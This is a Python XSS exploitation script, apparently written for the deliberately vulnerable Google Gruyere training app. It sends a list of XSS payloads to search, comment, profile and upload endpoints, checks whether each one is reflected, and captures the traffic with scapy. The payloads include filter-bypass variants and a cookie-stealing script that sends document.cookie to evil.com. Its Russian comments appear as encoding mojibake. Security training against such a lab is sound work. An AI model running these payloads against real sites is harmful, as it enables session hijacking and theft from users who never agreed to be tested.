#!/usr/bin/env python3
"""
–°–∫—Ä–∏–ø—Ç –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–∞ Google Gruyere.
–ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –≤–µ—Ä—Å–∏—è —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º.
"""
import requests
import time
from scapy.all import sniff, wrpcap, IP, TCP
import threading
import sys
import logging
from urllib.parse import urlparse, quote
from typing import List, Dict, Optional
from datetime import datetime

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_exploit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class XSSCapture:
    """–ö–ª–∞—Å—Å –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –≤–æ –≤—Ä–µ–º—è XSS –∞—Ç–∞–∫–∏"""
    
    def __init__(self):
        self.packets: List = []
        self.capturing = False
        self.thread: Optional[threading.Thread] = None
        
    def start(self, output_file: str = "xss_attack.pcap", port: int = 8080):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç –∑–∞—Ö–≤–∞—Ç —Ç—Ä–∞—Ñ–∏–∫–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ"""
        self.capturing = True
        self.packets = []
        
        def capture_traffic():
            logger.info(f"–ù–∞—á–∞–ª–æ –∑–∞—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –≤ —Ñ–∞–π–ª: {output_file}")
            
            def packet_handler(packet):
                if self.capturing and IP in packet and TCP in packet:
                    self.packets.append(packet)
                    if len(self.packets) % 10 == 0:
                        logger.debug(f"–ó–∞—Ö–≤–∞—á–µ–Ω–æ –ø–∞–∫–µ—Ç–æ–≤: {len(self.packets)}")
            
            # –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–º –ø–æ—Ä—Ç—É
            sniff(
                filter=f"tcp port {port}",
                prn=packet_handler,
                store=False,
                timeout=30
            )
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã–π —Ç—Ä–∞—Ñ–∏–∫
            if self.packets:
                wrpcap(output_file, self.packets)
                logger.info(f"–ó–∞—Ö–≤–∞—á–µ–Ω–æ {len(self.packets)} –ø–∞–∫–µ—Ç–æ–≤, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ –≤ {output_file}")
            
            self.capturing = False
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞—Ö–≤–∞—Ç –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        self.thread = threading.Thread(target=capture_traffic)
        self.thread.daemon = True
        self.thread.start()
        
        # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫ —Å–Ω–∏—Ñ—Ñ–µ—Ä–∞
        time.sleep(2)
    
    def stop(self):
        """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –∑–∞—Ö–≤–∞—Ç —Ç—Ä–∞—Ñ–∏–∫–∞"""
        self.capturing = False
        if self.thread:
            self.thread.join(timeout=5)

class XSSValidator:
    """–ö–ª–∞—Å—Å –¥–ª—è –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
    
    @staticmethod
    def validate_url(url: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å URL"""
        try:
            parsed = urlparse(url)
            if parsed.scheme not in ['http', 'https']:
                raise ValueError("–ù–µ–≤–µ—Ä–Ω–∞—è —Å—Ö–µ–º–∞ URL. –î–æ–ø—É—Å—Ç–∏–º—ã —Ç–æ–ª—å–∫–æ http/https")
            if not parsed.netloc:
                raise ValueError("–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ–º–µ–Ω –≤ URL")
            
            # –ó–∞–ø—Ä–µ—â–∞–µ–º –æ–ø–∞—Å–Ω—ã–µ –¥–æ–º–µ–Ω—ã (–ø—Ä–∏–º–µ—Ä)
            dangerous_domains = ['localhost', '127.0.0.1', '0.0.0.0']
            if any(domain in parsed.netloc for domain in dangerous_domains):
                logger.warning(f"URL —Å–æ–¥–µ—Ä–∂–∏—Ç –ª–æ–∫–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å: {parsed.netloc}")
            
            return True
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ URL: {e}")
            return False
    
    @staticmethod
    def safe_request(url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        """–ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ HTTP –∑–∞–ø—Ä–æ—Å–∞"""
        try:
            # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º —Ç–∞–π–º–∞—É—Ç
            kwargs.setdefault('timeout', 10)
            
            if method.upper() == 'GET':
                return requests.get(url, **kwargs)
            elif method.upper() == 'POST':
                return requests.post(url, **kwargs)
            else:
                raise ValueError(f"–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π –º–µ—Ç–æ–¥: {method}")
        except requests.exceptions.Timeout:
            logger.error(f"–¢–∞–π–º–∞—É—Ç –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ {url}")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –∫ {url}: {e}")
            return None
        except Exception as e:
            logger.error(f"–ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")
            return None

class XSSTester:
    """–ö–ª–∞—Å—Å –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.results: List[Dict] = []
        self.validator = XSSValidator()
        
    def test_xss_gruyere(self):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ XSS –≤–µ–∫—Ç–æ—Ä—ã –Ω–∞ Google Gruyere"""
        
        logger.info(f"–ù–∞—á–∞–ª–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è XSS –Ω–∞ {self.base_url}")
        print("=" * 70)
        print("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï XSS –£–Ø–ó–í–ò–ú–û–°–¢–ï–ô –ù–ê GOOGLE GRUYERE")
        print("=" * 70)
        print(f"–î–∞—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
        print(f"–¶–µ–ª–µ–≤–æ–π URL: {self.base_url}")
        
        # –°–ø–∏—Å–æ–∫ —Ç–µ—Å—Ç–æ–≤—ã—Ö XSS payload
        xss_payloads = [
            # –ë–∞–∑–æ–≤—ã–µ XSS
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<svg onload='alert(1)'>",
            "<body onload=alert('XSS')>",
            
            # –ë–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã–µ payload
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<iframe src='javascript:alert(\"XSS\")'>",
            
            # –û–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–æ–≤
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=\"alert('XSS')\">",
            "'\"><script>alert('XSS')</script>",
            
            # URL encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "javascript:alert('XSS')",
        ]
        
        # –¢–æ—á–∫–∏ –≤–≤–æ–¥–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        test_cases = [
            {
                "name": "–ü–æ–ª–µ –ø–æ–∏—Å–∫–∞ (GET –ø–∞—Ä–∞–º–µ—Ç—Ä)",
                "url": f"{self.base_url}/search",
                "method": "GET",
                "params": {"q": ""},
                "field": "q"
            },
            {
                "name": "–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ (POST –∑–∞–ø—Ä–æ—Å)",
                "url": f"{self.base_url}/new_comment",
                "method": "POST",
                "data": {"comment": ""},
                "field": "comment"
            },
            {
                "name": "–ü—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è",
                "url": f"{self.base_url}/edit_profile",
                "method": "POST",
                "data": {"description": ""},
                "field": "description"
            },
            {
                "name": "–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∑–∫–∏",
                "url": f"{self.base_url}/upload",
                "method": "POST",
                "files": {"file": ("test.txt", b"test content")},
                "field": "filename"
            }
        ]
        
        for test_case in test_cases:
            print(f"\n{'='*50}")
            print(f"–¢–µ—Å—Ç–∏—Ä—É–µ–º: {test_case['name']}")
            print(f"{'='*50}")
            
            for payload in xss_payloads:
                try:
                    if test_case['method'] == 'GET':
                        # –î–ª—è GET –∑–∞–ø—Ä–æ—Å–æ–≤
                        params = test_case['params'].copy()
                        params[test_case['field']] = payload
                        response = self.validator.safe_request(
                            test_case['url'], 
                            method='GET',
                            params=params
                        )
                    else:
                        # –î–ª—è POST –∑–∞–ø—Ä–æ—Å–æ–≤
                        if 'files' in test_case:
                            # –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞
                            files = {'file': (f"test_xss{payload[:10]}.txt", b"test content")}
                            response = self.validator.safe_request(
                                test_case['url'],
                                method='POST',
                                files=files
                            )
                        else:
                            data = test_case['data'].copy()
                            data[test_case['field']] = payload
                            response = self.validator.safe_request(
                                test_case['url'],
                                method='POST',
                                data=data
                            )
                    
                    if not response:
                        print(f"  ‚ö†Ô∏è –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è payload: {payload[:50]}...")
                        continue
                    
                    # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –æ—Ç—Ä–∞–∂–µ–Ω–Ω–æ–≥–æ XSS
                    if payload.replace(' ', '') in response.text.replace(' ', ''):
                        print(f"  ‚úÖ –£–Ø–ó–í–ò–ú–û–°–¢–¨: {payload[:50]}...")
                        print(f"     Payload –æ—Ç—Ä–∞–∂–µ–Ω –≤ –æ—Ç–≤–µ—Ç–µ!")
                        
                        self.results.append({
                            "test_case": test_case['name'],
                            "payload": payload,
                            "url": response.url,
                            "status_code": response.status_code,
                            "vulnerable": True,
                            "reason": "Payload –æ—Ç—Ä–∞–∂–µ–Ω –≤ –æ—Ç–≤–µ—Ç–µ"
                        })
                        
                        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ–≥–æ –æ—Ç–≤–µ—Ç–∞
                        safe_name = test_case['name'].replace(' ', '_').replace('(', '').replace(')', '')
                        with open(f"xss_vulnerable_{safe_name}.txt", "w", encoding='utf-8') as f:
                            f.write(f"URL: {response.url}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write(f"Status: {response.status_code}\n")
                            f.write(f"–î–∞—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
                            f.write("\n–û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞ (–ø–µ—Ä–≤—ã–µ 2000 —Å–∏–º–≤–æ–ª–æ–≤):\n")
                            f.write(response.text[:2000])
                        
                        logger.warning(f"–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ {test_case['name']}: {payload[:50]}")
                        
                    else:
                        print(f"  ‚ùå –ó–∞—â–∏—â–µ–Ω–æ: {payload[:50]}...")
                        
                        self.results.append({
                            "test_case": test_case['name'],
                            "payload": payload,
                            "url": response.url,
                            "status_code": response.status_code,
                            "vulnerable": False,
                            "reason": "Payload –Ω–µ –æ—Ç—Ä–∞–∂–µ–Ω"
                        })
                    
                except Exception as e:
                    error_msg = str(e)[:50]
                    print(f"  ‚ö†Ô∏è –û—à–∏–±–∫–∞: {error_msg}...")
                    self.results.append({
                        "test_case": test_case['name'],
                        "payload": payload,
                        "error": str(e),
                        "vulnerable": False,
                        "reason": f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {e}"
                    })
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ {test_case['name']}: {e}")
                
                # –ù–µ–±–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                time.sleep(0.5)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        self.save_results()
        return self.results
    
    def save_results(self):
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""
        with open("xss_test_results.txt", "w", encoding='utf-8') as f:
            f.write("–†–ï–ó–£–õ–¨–¢–ê–¢–´ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø XSS\n")
            f.write("="*50 + "\n\n")
            f.write(f"–î–∞—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
            
            vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
            total_tests = len(self.results)
            
            f.write(f"–í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: {total_tests}\n")
            f.write(f"–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–∞–π–¥–µ–Ω—ã: {vulnerable_count}\n")
            f.write(f"–ü—Ä–æ—Ü–µ–Ω—Ç —É—è–∑–≤–∏–º—ã—Ö: {(vulnerable_count/total_tests*100):.1f}%\n\n")
            
            for result in self.results:
                status = "‚úÖ –£–Ø–ó–í–ò–ú–û" if result.get('vulnerable', False) else "‚ùå –ó–ê–©–ò–©–ï–ù–û"
                f.write(f"{status} - {result['test_case']}\n")
                f.write(f"  Payload: {result.get('payload', 'N/A')[:100]}\n")
                if 'url' in result:
                    f.write(f"  URL: {result['url']}\n")
                f.write(f"  –ü—Ä–∏—á–∏–Ω–∞: {result.get('reason', 'N/A')}\n")
                f.write("-"*40 + "\n")
        
        logger.info(f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã. –£—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–∞–π–¥–µ–Ω–æ: {vulnerable_count}/{total_tests}")
        print(f"\n{'='*70}")
        print(f"–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ó–ê–í–ï–†–®–ï–ù–û")
        print(f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ xss_test_results.txt")

def main():
    print("=" * 70)
    print("XSS –≠–ö–°–ü–õ–û–ò–¢–ï–† –î–õ–Ø GOOGLE GRUYERE")
    print("=" * 70)
    print(f"–î–∞—Ç–∞ –∑–∞–ø—É—Å–∫–∞: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    print("\n–ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —É—á–µ–±–Ω–æ–≥–æ —Å–∞–π—Ç–∞!")
    print("–ù–µ —Ç–µ—Å—Ç–∏—Ä—É–π—Ç–µ —Å–∞–π—Ç—ã –±–µ–∑ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤–ª–∞–¥–µ–ª—å—Ü–µ–≤.\n")
    
    # –í–∞–ª–∏–¥–∞—Ü–∏—è URL
    base_url = input("–í–≤–µ–¥–∏—Ç–µ URL Google Gruyere (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é http://localhost:8080): ").strip()
    if not base_url:
        base_url = "http://localhost:8080"
    
    validator = XSSValidator()
    if not validator.validate_url(base_url):
        print(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π URL: {base_url}")
        print("–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: http://localhost:8080 –∏–ª–∏ https://google-gruyere.appspot.com")
        sys.exit(1)
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ—Ä—Ç –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞
    parsed_url = urlparse(base_url)
    if parsed_url.scheme == 'https':
        port = 443
        print("‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: HTTPS —Ç—Ä–∞—Ñ–∏–∫ –±—É–¥–µ—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω!")
        print("   –î–ª—è –∞–Ω–∞–ª–∏–∑–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ª–æ–∫–∞–ª—å–Ω—É—é –≤–µ—Ä—Å–∏—é –Ω–∞ HTTP.")
    else:
        port = parsed_url.port or 8080
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞—Ö–≤–∞—Ç —Ç—Ä–∞—Ñ–∏–∫–∞
    capture = XSSCapture()
    print(f"\n–ó–∞–ø—É—Å–∫ –∑–∞—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –Ω–∞ –ø–æ—Ä—Ç—É {port}...")
    capture.start(port=port)
    
    time.sleep(3)  # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫ —Å–Ω–∏—Ñ—Ñ–µ—Ä–∞
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS
    tester = XSSTester(base_url)
    results = tester.test_xss_gruyere()
    
    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–∞—Ö–≤–∞—Ç —Ç—Ä–∞—Ñ–∏–∫–∞
    capture.stop()
    
    # –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    vulnerable_count = sum(1 for r in results if r.get('vulnerable', False))
    print(f"\n{'='*70}")
    print("–ò–¢–û–ì–ò –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø:")
    print(f"  –í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: {len(results)}")
    print(f"  –£—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–∞–π–¥–µ–Ω–æ: {vulnerable_count}")
    
    if vulnerable_count > 0:
        print("\n‚úÖ XSS –£–Ø–ó–í–ò–ú–û–°–¢–ò –û–ë–ù–ê–†–£–ñ–ï–ù–´!")
        print("   –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–∞–π–ª—ã xss_vulnerable_*.txt")
    else:
        print("\n‚ùå XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ")
        print("   –°–∞–π—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞—â–∏—â–µ–Ω –∏–ª–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è –¥—Ä—É–≥–∏–µ –≤–µ–∫—Ç–æ—Ä—ã –∞—Ç–∞–∫–∏")
    
    print("\nüìÅ –°–æ–∑–¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:")
    print("  - xss_attack.pcap - –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã–π —Ç—Ä–∞—Ñ–∏–∫ –≤–æ –≤—Ä–µ–º—è –∞—Ç–∞–∫–∏")
    print("  - xss_test_results.txt - —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")
    print("  - xss_exploit.log - –ª–æ–≥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è")
    print("\n–î–∞–ª–µ–µ –∑–∞–ø—É—Å—Ç–∏—Ç–µ: python3 analyze_xss_traffic.py")

if __name__ == "__main__":
    main()
